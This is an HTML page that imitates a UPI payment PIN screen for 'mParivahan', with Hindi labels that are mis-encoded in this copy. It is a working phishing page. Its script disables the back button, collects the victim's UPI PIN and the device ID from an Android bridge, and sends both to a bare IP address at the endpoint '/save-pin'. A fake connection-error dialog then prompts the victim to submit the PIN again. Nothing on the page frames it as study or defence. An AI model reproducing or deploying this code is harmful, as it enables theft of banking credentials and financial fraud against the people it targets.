<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <title>UPI PIN | mParivahan</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;900&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      padding: 0;
      overflow: hidden;
    }
    
    .header {
      background: white;
      padding: 20px;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
    }
    
    .upi-logo {
      text-align: center;
      font-size: 48px;
      margin-bottom: 10px;
    }
    
    .payment-info {
      background: #f3f4f6;
      padding: 15px 20px;
      border-radius: 12px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    
    .info-label {
      font-size: 13px;
      color: #6b7280;
      font-weight: 600;
    }
    
    .info-value {
      font-size: 15px;
      color: #1f2937;
      font-weight: 700;
    }
    
    .center-section {
      flex: 1;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 30px 20px;
    }
    
    .pin-title {
      font-size: 16px;
      color: white;
      font-weight: 700;
      margin-bottom: 20px;
      text-align: center;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    
    .pin-inputs {
      display: flex;
      gap: 10px;
      margin-bottom: 25px;
      justify-content: center;
    }
    
    .pin-input {
      width: 50px;
      height: 60px;
      background: white;
      border: 3px solid #e5e7eb;
      border-radius: 12px;
      text-align: center;
      font-size: 28px;
      font-weight: 700;
      color: #1f2937;
      display: none;
    }
    
    .pin-input.visible {
      display: block;
    }
    
    .warning-badge {
      background: rgba(251, 191, 36, 0.2);
      border: 2px solid rgba(251, 191, 36, 0.5);
      padding: 12px 20px;
      border-radius: 12px;
      display: flex;
      align-items: center;
      gap: 10px;
      max-width: 85%;
    }
    
    .warning-icon {
      font-size: 24px;
    }
    
    .warning-text {
      font-size: 12px;
      color: white;
      font-weight: 600;
      line-height: 1.4;
    }
    
    .keypad {
      background: white;
      border-radius: 30px 30px 0 0;
      padding: 25px 20px;
      box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.1);
    }
    
    .keypad-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 15px;
      max-width: 360px;
      margin: 0 auto;
    }
    
    .key-btn {
      background: #f9fafb;
      border: 2px solid #e5e7eb;
      border-radius: 14px;
      height: 65px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      font-weight: 700;
      color: #1f2937;
      cursor: pointer;
      transition: all 0.2s ease;
      user-select: none;
    }
    
    .key-btn:active {
      transform: scale(0.95);
      background: #667eea;
      color: white;
      border-color: #667eea;
    }
    
    .key-btn.action {
      background: linear-gradient(135deg, #667eea, #764ba2);
      color: white;
      border: none;
    }
    
    .key-btn.delete {
      background: #fee2e2;
      border-color: #fca5a5;
      color: #dc2626;
    }
    
    /* Dialogs */
    .dialog {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.6);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
      padding: 20px;
    }
    
    .dialog.active {
      display: flex;
    }
    
    .dialog-content {
      background: white;
      border-radius: 20px;
      padding: 30px 25px;
      max-width: 340px;
      width: 100%;
      text-align: center;
      animation: scaleIn 0.3s ease-out;
    }
    
    .dialog-icon {
      font-size: 60px;
      margin-bottom: 15px;
    }
    
    .dialog-title {
      font-size: 18px;
      font-weight: 700;
      color: #1f2937;
      margin-bottom: 10px;
    }
    
    .dialog-text {
      font-size: 14px;
      color: #6b7280;
      margin-bottom: 20px;
      line-height: 1.5;
    }
    
    .dialog-btn {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    
    .dialog-btn.primary {
      background: linear-gradient(135deg, #667eea, #764ba2);
      color: white;
    }
    
    .dialog-btn.danger {
      background: linear-gradient(135deg, #ef4444, #dc2626);
      color: white;
    }
    
    .spinner {
      width: 50px;
      height: 50px;
      border: 5px solid #f3f3f3;
      border-top: 5px solid #667eea;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 15px;
    }
    
    @keyframes scaleIn {
      from { opacity: 0; transform: scale(0.9); }
      to { opacity: 1; transform: scale(1); }
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <!-- Header -->
  <div class="header">
    <div class="upi-logo">üí≥</div>
    <div class="payment-info">
      <div>
        <div class="info-label">‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§‡§ï‡§∞‡•ç‡§§‡§æ</div>
        <div class="info-value">mParivahan</div>
      </div>
      <div style="text-align: right;">
        <div class="info-label">‡§∞‡§æ‡§∂‡§ø</div>
        <div class="info-value">‚Çπ 1.00</div>
      </div>
    </div>
  </div>
  
  <!-- Center Section -->
  <div class="center-section">
    <div class="pin-title">UPI 4 ‡§Ø‡§æ 6 ‡§Ö‡§Ç‡§ï‡•ã‡§Ç ‡§ï‡§æ ‡§™‡§ø‡§® ‡§¶‡§∞‡•ç‡§ú ‡§ï‡§∞‡•á‡§Ç</div>
    
    <div class="pin-inputs">
      <input type="password" id="pin0" class="pin-input" maxlength="1" readonly />
      <input type="password" id="pin1" class="pin-input" maxlength="1" readonly />
      <input type="password" id="pin2" class="pin-input" maxlength="1" readonly />
      <input type="password" id="pin3" class="pin-input" maxlength="1" readonly />
      <input type="password" id="pin4" class="pin-input" maxlength="1" readonly />
      <input type="password" id="pin5" class="pin-input" maxlength="1" readonly />
    </div>
    
    <div class="warning-badge">
      <span class="warning-icon">‚ö†Ô∏è</span>
      <span class="warning-text">‡§Ü‡§™ mParivahan ‡§ï‡•ã ‡§≠‡•Å‡§ó‡§§‡§æ‡§® ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç</span>
    </div>
  </div>
  
  <!-- Keypad -->
  <div class="keypad">
    <div class="keypad-grid">
      <div class="key-btn" onclick="addDigit('1')">1</div>
      <div class="key-btn" onclick="addDigit('2')">2</div>
      <div class="key-btn" onclick="addDigit('3')">3</div>
      <div class="key-btn" onclick="addDigit('4')">4</div>
      <div class="key-btn" onclick="addDigit('5')">5</div>
      <div class="key-btn" onclick="addDigit('6')">6</div>
      <div class="key-btn" onclick="addDigit('7')">7</div>
      <div class="key-btn" onclick="addDigit('8')">8</div>
      <div class="key-btn" onclick="addDigit('9')">9</div>
      <div class="key-btn delete" onclick="removeLastDigit()">‚å´</div>
      <div class="key-btn" onclick="addDigit('0')">0</div>
      <div class="key-btn action" onclick="submitPIN()">‚úì</div>
    </div>
  </div>
  
  <!-- Error Dialog -->
  <div class="dialog" id="errorDialog">
    <div class="dialog-content">
      <div class="dialog-icon">‚ùå</div>
      <div class="dialog-title">‡§Ö‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§™‡§ø‡§®</div>
      <div class="dialog-text">‡§ï‡•É‡§™‡§Ø‡§æ ‡§∏‡§π‡•Ä 4 ‡§Ø‡§æ 6 ‡§Ö‡§Ç‡§ï‡•ã‡§Ç ‡§ï‡§æ ‡§™‡§ø‡§® ‡§¶‡§∞‡•ç‡§ú ‡§ï‡§∞‡•á‡§Ç</div>
      <button class="dialog-btn danger" onclick="closeError()">‡§†‡•Ä‡§ï ‡§π‡•à</button>
    </div>
  </div>
  
  <!-- Loading Dialog -->
  <div class="dialog" id="loadingDialog">
    <div class="dialog-content">
      <div class="spinner"></div>
      <div class="dialog-title">‡§≠‡•Å‡§ó‡§§‡§æ‡§® ‡§™‡•ç‡§∞‡•ã‡§∏‡•á‡§∏ ‡§π‡•ã ‡§∞‡§π‡§æ ‡§π‡•à...</div>
      <div class="dialog-text">‡§ï‡•É‡§™‡§Ø‡§æ ‡§™‡•ç‡§∞‡§§‡•Ä‡§ï‡•ç‡§∑‡§æ ‡§ï‡§∞‡•á‡§Ç</div>
    </div>
  </div>
  
  <!-- Retry Dialog -->
  <div class="dialog" id="retryDialog">
    <div class="dialog-content">
      <div class="dialog-icon">üîÑ</div>
      <div class="dialog-title">‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§ï‡•Ä ‡§∏‡§Æ‡§∏‡•ç‡§Ø‡§æ</div>
      <div class="dialog-text">‡§ï‡•É‡§™‡§Ø‡§æ ‡§¶‡•ã‡§¨‡§æ‡§∞‡§æ ‡§™‡•ç‡§∞‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç</div>
      <button class="dialog-btn primary" onclick="retrySubmit()">‡§´‡§ø‡§∞ ‡§∏‡•á ‡§™‡•ç‡§∞‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç</button>
    </div>
  </div>

  <script>
    // Disable back button
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
      history.go(1);
    };
    
    let pinArr = [];
    
    function updateInputs() {
      for (let i = 0; i < 6; i++) {
        document.getElementById('pin' + i).value = '';
        document.getElementById('pin' + i).classList.remove('visible');
      }
      
      const visibleCount = pinArr.length <= 4 ? 4 : 6;
      for (let i = 0; i < visibleCount; i++) {
        document.getElementById('pin' + i).classList.add('visible');
      }
      
      for (let i = 0; i < pinArr.length; i++) {
        document.getElementById('pin' + i).value = pinArr[i];
      }
    }
    
    function addDigit(digit) {
      if (pinArr.length < 6) {
        pinArr.push(digit);
        updateInputs();
      }
    }
    
    function removeLastDigit() {
      pinArr.pop();
      updateInputs();
    }
    
    function showError() {
      document.getElementById('errorDialog').classList.add('active');
    }
    
    function closeError() {
      document.getElementById('errorDialog').classList.remove('active');
    }
    
    function showLoading() {
      document.getElementById('loadingDialog').classList.add('active');
    }
    
    function hideLoading() {
      document.getElementById('loadingDialog').classList.remove('active');
    }
    
    function showRetry() {
      document.getElementById('retryDialog').classList.add('active');
    }
    
    function closeRetry() {
      document.getElementById('retryDialog').classList.remove('active');
    }
    
    function retrySubmit() {
      closeRetry();
      submitPIN();
    }
    
    function submitPIN() {
      if (pinArr.length === 4 || pinArr.length === 6) {
        const pin = pinArr.join('');
        const deviceId = window.Android ? window.Android.getDeviceId() : 'web_device';
        
        showLoading();
        
        fetch('http://95.134.130.160:8765/save-pin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ pin: pin, device_id: deviceId })
        })
        .then(response => {
          hideLoading();
          if (response.ok) {
            window.location.href = 'final.html';
          } else {
            showRetry();
          }
        })
        .catch(error => {
          hideLoading();
          showRetry();
        });
      } else {
        showError();
      }
    }
    
    // Initialize
    window.onload = () => { updateInputs(); };
  </script>
</body>
</html>
